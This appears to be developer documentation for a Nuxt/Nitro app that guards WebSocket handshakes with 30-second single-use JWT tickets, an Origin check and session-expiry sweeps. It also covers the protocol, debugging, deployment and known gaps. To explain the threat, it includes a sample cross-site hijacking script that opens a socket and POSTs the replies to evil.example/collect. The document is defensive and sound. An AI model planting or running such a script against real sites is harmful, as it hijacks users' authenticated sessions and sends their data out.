# WebSockets: JWT handshake auth over Nitro

A WebSocket upgrade is an ordinary HTTP `GET` right up to the `101`, and then it
stops being one. Three consequences shape everything in this document, and each
of them is a place where the obvious implementation is quietly wrong:

1. **The browser cannot set request headers on it.** The `WebSocket`
   constructor takes a URL and a subprotocol list, and nothing else. There is
   no `Authorization: Bearer …` to send.
2. **The handshake is exempt from the same-origin policy.** No preflight, no
   `Access-Control-Allow-Origin`, no opt-in. Any page on any origin can open a
   socket to this app, and the browser will attach this app's cookies to it.
3. **The middleware chain does not run.** Nitro serves requests through
   `toNodeListener(h3App)` and upgrades through a separate `upgrade` listener on
   the HTTP server. `server/middleware/10.auth.ts` is not on that path, so
   `server/utils/access-policy.ts` — this app's default-deny gate over
   `/api/**` — does not apply to a socket.

| File                           | What it is                                               |
| ------------------------------ | -------------------------------------------------------- |
| `types/websocket.ts`           | Wire protocol, close codes, the ticket subprotocol name. |
| `server/utils/ws-ticket.ts`    | Minting, verifying and spending a handshake ticket.      |
| `server/utils/ws-handshake.ts` | The gate: origin, credential, replay, revocation.        |
| `server/utils/ws-frames.ts`    | Parsing and sizing what a connected client sends.        |
| `server/utils/ws-config.ts`    | `runtimeConfig` → a signing key, a TTL, an origin list.  |
| `server/api/ws/ticket.post.ts` | `POST` a channel, get a ticket. Session-authenticated.   |
| `server/api/ws/echo.ts`        | The `echo` channel — `defineWebSocketHandler`.           |
| `composables/useWsChannel.ts`  | The client: ticket, connect, typed frames, reconnect.    |
| `pages/websockets.vue`         | The demo, including the failure modes.                   |

## The attack this is shaped around

Cross-site WebSocket hijacking. Point 2 above is not a mistake anyone made; it is
what the protocol says. So:

```html
<!-- on https://evil.example, in a tab where the victim is signed in -->
<script>
  const ws = new WebSocket('wss://your-app.test/api/ws/echo')
  ws.onmessage = (e) => fetch('https://evil.example/collect', { method: 'POST', body: e.data })
</script>
```

The browser sends this app's session cookie with that handshake. If the cookie is
what admits the socket, the socket is admitted, and `evil.example` now has a
full-duplex authenticated channel — read _and_ write, unlike a CSRF POST, and
with no CORS to stop it reading the replies.

The fix is a credential the attacker's page cannot obtain:

```
Browser                          This app
   │
   │ POST /api/ws/ticket  { channel: 'echo' }        ← same-origin fetch, CORS applies
   │   Cookie: nuxt-session=…
   │   Content-Type: application/json                ← forces a preflight cross-origin
   │──────────────────────────────────────────────▶
   │◀──── { token, subprotocol, expiresAt }          ← body unreadable cross-origin
   │
   │ GET /api/ws/echo   Upgrade: websocket           ← no CORS here, and it does not matter
   │   Sec-WebSocket-Protocol: nuxt.ws.ticket.v1, <token>
   │──────────────────────────────────────────────▶  verify signature, aud, exp
   │                                                 check Origin
   │                                                 burn the jti (single use)
   │                                                 check the session is not revoked
   │◀──── 101, or 401/403 and no socket at all
```

`evil.example` can still open the socket. It cannot present a ticket, because
every route to obtaining one is a route CORS governs — and the handshake refuses
a socket with no ticket regardless of how good the cookie is.

The origin check is a second layer, not the main one. A browser sets `Origin` on
a handshake and cannot be made to lie about it, so it catches a cross-origin page
that somehow holds a ticket. A missing `Origin` is allowed, because that is what
a non-browser client sends and a non-browser client can send any value it likes —
requiring the header would break every CLI while stopping no attacker.

## Connecting

```ts
// 1. Get a ticket. Ordinary authenticated fetch; the session cookie does this part.
const { data } = await $fetch<ApiResponse<WsTicketResponse>>('/api/ws/ticket', {
  method: 'POST',
  body: { channel: 'echo' },
})

// 2. Open the socket. Marker first, token second — the server selects the first
//    protocol offered, and echoing the token back would put it in the response.
const url = new URL('/api/ws/echo', location.href)
url.protocol = location.protocol === 'https:' ? 'wss:' : 'ws:'
const socket = new WebSocket(url, [data.subprotocol, data.token])

socket.addEventListener('message', (event) => {
  const frame: WsServerFrame = JSON.parse(event.data)
  if (frame.type === 'welcome') console.log('authenticated as', frame.userId)
})
```

`composables/useWsChannel.ts` is this with the parts a real client needs — typed
frames, a fresh ticket per attempt, exponential backoff, and teardown bound to
the component's `effectScope`.

The ticket may travel in the query string instead (`?ticket=…`) for a client that
cannot offer a subprotocol. That transport is supported and second-best: a query
string reaches access logs, referrers and APM traces. What makes it survivable is
that the ticket lives 30 seconds, is spent on first use, and is scoped to one
channel.

## Why a ticket and not the session

Because a bearer credential in a URL that lives as long as the session is a
session cookie stripped of every protection a cookie has — no `HttpOnly`, no
`Secure`, no `SameSite`, and a lifetime in days.

A ticket is a JWT (HS256) with the claims a socket needs and nothing else:

| Claim | Value                 | Why                                                       |
| ----- | --------------------- | --------------------------------------------------------- |
| `iss` | `boilerplate-nuxt/ws` | Rejects a token minted by something else holding the key. |
| `aud` | the channel           | A ticket for `echo` cannot open `chat`.                   |
| `sub` | the user id           | Who the socket is.                                        |
| `sid` | the h3 session id     | What revoking the session revokes.                        |
| `jti` | a UUID                | What makes it single-use.                                 |
| `exp` | `iat + 30s`           | What makes a leaked log entry inert.                      |
| `typ` | `ws-ticket+jwt`       | RFC 8725 explicit typing: not an access token.            |

The signing key is **derived**, not configured: HKDF-SHA256 over
`NUXT_SESSION_PASSWORD` with a fixed context string. One secret to deploy, two
cryptographically unrelated keys — a ticket signature is not a corpus for
attacking the session cookie. Set `NUXT_WS_TICKET_SECRET` only if you want the
two to rotate independently.

WebCrypto rather than `node:crypto`, so the module runs unchanged on the
Cloudflare and Deno presets.

## Writing a channel

```ts
// server/api/ws/<channel>.ts
export default defineWebSocketHandler({
  async upgrade(request) {
    const { key, allowedOrigins } = await useWsConfig()

    const result = await authorizeHandshake(request, {
      key,
      channel: 'echo',
      allowedOrigins,
      readSession: sessionReader(useSessionStore()),
      spendTicket: ticketSpender(useWsTicketStore()),
    })

    if (!result.ok) return rejectionResponse(result.rejection)
    attachPrincipal(request.context, result.principal)
  },

  open(peer) {
    const principal = readPrincipal(peer.context) // never null after the above
  },
})
```

Add the channel name to `WS_CHANNELS` in `types/websocket.ts` and it is minted
for, validated against, and accepted by the ticket route with no other edit.

### Two traps in the `upgrade` hook

**Only a real `Response` with a non-2xx status rejects the upgrade.** crossws
decides what the hook meant by inspecting what it returned:

```js
const res = await this.callHook('upgrade', request)
if (!res) return { context } //                       proceed
if (res.ok === false) return { context, endResponse: res } // reject
if (res.headers) return { context, upgradeHeaders: res.headers } // proceed
return { context } //                                 proceed
```

`res.ok` is a property of `Response`, not of `ResponseInit`. So returning
`{ status: 401 }` — which type-checks, and which reads like a rejection —
**completes the upgrade**: the socket opens, the client sees `onopen`, and the
endpoint is unauthenticated. Always go through `rejectionResponse()`.

**`request.context` is not writable.** crossws installs it with
`Object.defineProperty(request, 'context', { value })` before calling the hook,
so `request.context = {…}` throws a `TypeError` in a module's strict-mode scope —
and a throw that is not a `Response` propagates out of `handleUpgrade`, rejecting
the socket with no response at all. `attachPrincipal()` mutates the object.

## What a socket owes that a request does not

An HTTP request is authorised once and then it is over. A socket is authorised
once and then stays open, so anything the request path re-checks per request has
to be re-checked on a timer here — or not at all, deliberately and in writing.

This handler closes a socket whose **session expires** while it is open
(`4001 SessionRevoked`, swept every 30s). A socket outliving the credential that
opened it is the failure that makes long-lived connections worse than requests.

It does **not** poll for revocation mid-connection. See the gaps below.

## The wire

Both directions are JSON objects with a `type` discriminant, text rather than
binary, so the network panel is readable.

| Direction | `type`     | Payload                                                      |
| --------- | ---------- | ------------------------------------------------------------ |
| →         | `ping`     | `{ nonce? }`                                                 |
| →         | `echo`     | `{ text }`                                                   |
| →         | `whoami`   | —                                                            |
| ←         | `welcome`  | `{ peerId, channel, userId, connectedAt, sessionExpiresAt }` |
| ←         | `pong`     | `{ nonce?, at }`                                             |
| ←         | `echoed`   | `{ text, seq }`                                              |
| ←         | `identity` | `{ userId, channel, ticketId }`                              |
| ←         | `error`    | `{ message }`                                                |

`welcome` exists because a `101` proves the _handshake_ succeeded and nothing
else. A client that treats `onopen` as "authenticated" is trusting a status line
it never sees.

Close codes are in the application range 4000-4999:

| Code | Meaning                                        |
| ---- | ---------------------------------------------- |
| 4000 | Protocol error — not JSON, or no known `type`. |
| 4001 | The session behind this socket ended.          |
| 4002 | A frame over 16 KiB.                           |

A frame that is not JSON closes the socket; a frame that is JSON but says
something unknown gets an `error` frame and stays connected. The split is not
arbitrary: a peer that cannot frame JSON cannot read an error frame either.

## Debugging a refused handshake

A rejected upgrade is the most opaque failure in this document. The client gets a
failed HTTP request and an `error` event with **no detail at all** — no status
code reaches JavaScript, and `onclose` fires with `code: 1006`, which means
nothing more than "abnormal". The status is visible only in the browser's network
panel, and the reason only in the server log:

```
[ws] upgrade refused on /api/ws/echo: ticket-expired (401)
```

That asymmetry is deliberate. The server distinguishes `expired`,
`bad-signature`, `wrong-channel`, `wrong-issuer`, `not-yet-valid`,
`incomplete-claims`, `malformed`, `ticket-replayed`, `session-revoked` and
`forbidden-origin`; the client gets one status and one constant body. Telling
them apart would be an oracle, and a legitimate client cannot act differently on
any of them anyway — it fetches a new ticket.

Common causes, in the order they actually happen:

- **`ticket-replayed` on a reconnect.** A ticket is single-use. Fetch a new one
  for every attempt, which is what `useWsChannel` does.
- **`ticket-expired` behind a slow page load.** 30 seconds is from mint to
  upgrade. Raise `NUXT_WS_TICKET_TTL_SECONDS` (capped at 300) rather than
  reusing a ticket.
- **A 426 instead of a handshake.** `nitro.experimental.websocket` is off, or
  the deployment preset has no WebSocket support. The route's HTTP half throws
  426 by design, which is what a missing upgrade listener looks like.
- **`forbidden-origin` from a separate front end.** Set
  `NUXT_WS_ALLOWED_ORIGINS`. The app's own host is always allowed.

## Deployment

- **`nitro.experimental.websocket: true` is required** (already set in
  `nuxt.config.ts`). Without it Nitro does not bundle the crossws adapter and
  never attaches an upgrade listener.
- **Not every preset supports it.** The Node preset this repo builds with does,
  as do Deno, Bun and Cloudflare. Vercel and Netlify's standard serverless
  functions do not — a socket needs a connection that outlives a request.
- **Point `NUXT_REDIS_URL` at Redis for more than one instance.** The replay
  guard and the revocation check both live on the `sessions` base
  (`docs/nitro-storage.md`). Per-process, a ticket burned on instance A is
  unknown to instance B, so the single-use guarantee is per-instance.
- **`sticky sessions` are not needed for the handshake** but are for anything
  that broadcasts: `peer.publish()` reaches the peers of one process.
- **Idle timeouts cull sockets exactly as they cull SSE streams**
  (`docs/sse.md`). The protocol has its own ping/pong frames and the `ws` server
  under crossws does not send them by default, so a long-idle channel needs an
  application-level keepalive — `useWsChannel` sends one every 25 seconds.

## Known gaps

- **Revocation is checked at the handshake, not during the connection.** Signing
  out closes no open socket; it only stops the next one. Closing existing sockets
  needs a pub/sub fan-out to every instance holding one, which is a different
  item. The session _expiry_ sweep is the partial cover.
- **The replay guard is not atomic.** `unstorage` has no compare-and-set, so two
  handshakes presenting the same ticket in the same event-loop turn can both see
  a miss. What is closed is reuse from a log or a referrer, not a race between
  two simultaneous attempts by the same user.
- **The replay guard fails open.** An unreachable store returns `unchecked` and
  the handshake proceeds, logging a warning — the same trade
  `server/utils/session-store.ts` documents, and the cost is bounded by the
  ticket's 30-second life.
- **No per-user connection limit and no rate limit on the ticket route.** An
  authenticated client can open as many sockets as it likes.
- **`peer.publish()` is not used.** Broadcast is a channel with subscribers,
  which this one does not have.
- **No Playwright coverage.** The socket-level verification in the PR was manual.
